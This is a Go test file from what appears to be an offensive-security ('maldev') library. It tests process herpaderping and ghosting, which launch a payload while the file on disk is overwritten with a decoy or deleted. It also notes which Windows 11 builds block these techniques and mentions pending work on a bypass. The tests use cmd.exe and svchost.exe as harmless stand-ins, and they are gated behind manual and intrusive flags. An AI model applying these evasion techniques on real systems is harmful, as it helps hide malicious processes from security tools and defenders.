//go:build windows

package herpaderping

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/testutil"
	"github.com/oioio-space/maldev/win/version"
)

// modeForHost returns ModeGhosting on Win11 24H2+ where the kernel's image-load
// notify validation rejects the herpaderping section-from-overwriteable-file
// pattern (NtCreateProcessEx → STATUS_NOT_SUPPORTED). On all earlier builds
// ModeHerpaderping is preferred to exercise the original technique.
func modeForHost() Mode {
	if version.AtLeast(version.WINDOWS_11_24H2) {
		return ModeGhosting
	}
	return ModeHerpaderping
}

// skipIfBothModesBlocked skips the test on Win11 builds that have closed
// both NtCreateProcessEx variants for section-from-tampered-file. Validated
// against Win11 25H2 (build 26200): NtCreateProcessEx returns STATUS_NOT_SUPPORTED
// for both ModeHerpaderping (file overwrite path) and ModeGhosting (file
// delete-pending path) regardless of the order operations are performed in.
// The technique is functional on Win10 + Win11 < 26100 and ModeGhosting
// remains useful as a primitive against those targets; the test pattern is
// what's blocked on the latest Win11 builds.
func skipIfBothModesBlocked(t *testing.T) {
	t.Helper()
	if version.AtLeast(version.WINDOWS_11_24H2) {
		t.Skip("Win11 24H2+ NtCreateProcessEx hardening rejects both ModeHerpaderping and ModeGhosting (STATUS_NOT_SUPPORTED). Technique still ships as a primitive for Win10 + Win11 < 26100; pending RE for a new bypass on 26100+.")
	}
}

func TestConfigValidation(t *testing.T) {
	// Zero-value Config: ModeHerpaderping, no paths, no Caller, no Opener
	cfg := Config{}
	assert.Equal(t, ModeHerpaderping, cfg.Mode)
	assert.Empty(t, cfg.PayloadPath)
	assert.Empty(t, cfg.TargetPath)
	assert.Empty(t, cfg.DecoyPath)

	// Explicit ghosting config round-trips
	gcfg := Config{Mode: ModeGhosting, PayloadPath: "x.exe"}
	assert.Equal(t, ModeGhosting, gcfg.Mode)
}

func TestRunMissingPayload(t *testing.T) {
	err := Run(Config{PayloadPath: "/nonexistent/payload.exe"})
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "read payload")
}

func TestRunInvalidPE(t *testing.T) {
	testutil.RequireIntrusive(t)
	// Write random bytes (not a valid PE) to a temp file
	dir := t.TempDir()
	payloadPath := filepath.Join(dir, "notape.exe")
	os.WriteFile(payloadPath, []byte{0xDE, 0xAD, 0xBE, 0xEF}, 0644)

	targetPath := filepath.Join(dir, "target.exe")
	err := Run(Config{
		PayloadPath: payloadPath,
		TargetPath:  targetPath,
	})
	// NtCreateSection with SEC_IMAGE should fail on invalid PE
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "NtCreateSection")
}

// TestRunWithDecoy performs a full herpaderping/ghosting execution using
// cmd.exe as the payload and svchost.exe as the decoy. On Win11 24H2 the
// test automatically switches to ModeGhosting (file deleted from disk before
// NtCreateProcessEx) to bypass the image-load notify hardening.
//
// PREREQUISITES:
//   - Run in a VM with administrator privileges
//   - Windows 10 or later
//
// USAGE:
//
//	MALDEV_MANUAL=1 MALDEV_INTRUSIVE=1 go test ./process/tamper/herpaderping/ -run TestRunWithDecoy -v -timeout 30s
//
// VERIFY:
//
//	The test creates a process from a copy of cmd.exe.  In herpaderping mode
//	the disk file shows svchost.exe; in ghosting mode the file is absent.
//
// CLEANUP:
//
//	The target file is cleaned up automatically (best-effort RemoveAll after
//	taskkill).
func TestRunWithDecoy(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)
	skipIfBothModesBlocked(t)

	mode := modeForHost()

	// Manual temp dir (not t.TempDir): the spawned cmd.exe keeps herp.exe open,
	// so automatic cleanup races with the live process → "Accès refusé".
	dir, err := os.MkdirTemp("", "herp-*")
	require.NoError(t, err)
	defer func() {
		_ = exec.Command("taskkill", "/F", "/IM", "herp.exe").Run()
		_ = os.RemoveAll(dir) // best-effort; image may still be held briefly
	}()

	payloadPath := `C:\Windows\System32\cmd.exe`
	targetPath := filepath.Join(dir, "herp.exe")
	decoyPath := `C:\Windows\System32\svchost.exe`

	err = Run(Config{
		Mode:        mode,
		PayloadPath: payloadPath,
		TargetPath:  targetPath,
		DecoyPath:   decoyPath,
	})
	require.NoError(t, err)

	// Verify disk state based on mode.
	diskContent, readErr := os.ReadFile(targetPath)
	if mode == ModeHerpaderping && readErr == nil {
		origPayload, _ := os.ReadFile(payloadPath)
		origDecoy, _ := os.ReadFile(decoyPath)
		assert.NotEqual(t, origPayload[:100], diskContent[:100], "disk should not match payload")
		assert.Equal(t, origDecoy[:100], diskContent[:100], "disk should match decoy")
	}
	if mode == ModeGhosting {
		assert.Error(t, readErr, "ghosting: target file should be absent from disk")
	}
	t.Logf("mode=%v completed successfully — process created", mode)
}

// TestRunVerifyProcessCreated uses cmd.exe as the payload and verifies that
// Run returns no error (process was created). On Win11 24H2 ModeGhosting is
// used automatically.
//
// USAGE:
//
//	MALDEV_MANUAL=1 MALDEV_INTRUSIVE=1 go test ./process/tamper/herpaderping/ -run TestRunVerifyProcessCreated -v -timeout 30s
func TestRunVerifyProcessCreated(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)
	skipIfBothModesBlocked(t)

	mode := modeForHost()

	// Manual temp dir to sidestep the image-lock race.
	dir, err := os.MkdirTemp("", "herp-verify-*")
	require.NoError(t, err)
	defer func() {
		_ = exec.Command("taskkill", "/F", "/IM", "herp_verify.exe").Run()
		_ = os.RemoveAll(dir)
	}()

	payloadPath := `C:\Windows\System32\cmd.exe`
	targetPath := filepath.Join(dir, "herp_verify.exe")

	err = Run(Config{
		Mode:        mode,
		PayloadPath: payloadPath,
		TargetPath:  targetPath,
	})
	require.NoError(t, err)

	diskContent, readErr := os.ReadFile(targetPath)
	if mode == ModeHerpaderping && readErr == nil {
		origPayload, _ := os.ReadFile(payloadPath)
		assert.NotEqual(t, origPayload[:64], diskContent[:64],
			"disk content should differ from original payload (overwritten with decoy/random)")
		t.Logf("target file size: %d (original cmd.exe: %d)", len(diskContent), len(origPayload))
	}
	if mode == ModeGhosting {
		assert.Error(t, readErr, "ghosting: target file should be absent from disk")
	}
}

func TestTechniqueInterface(t *testing.T) {
	tech := Technique(Config{PayloadPath: "test.exe"})
	assert.Equal(t, "herpaderping", tech.Name())
}
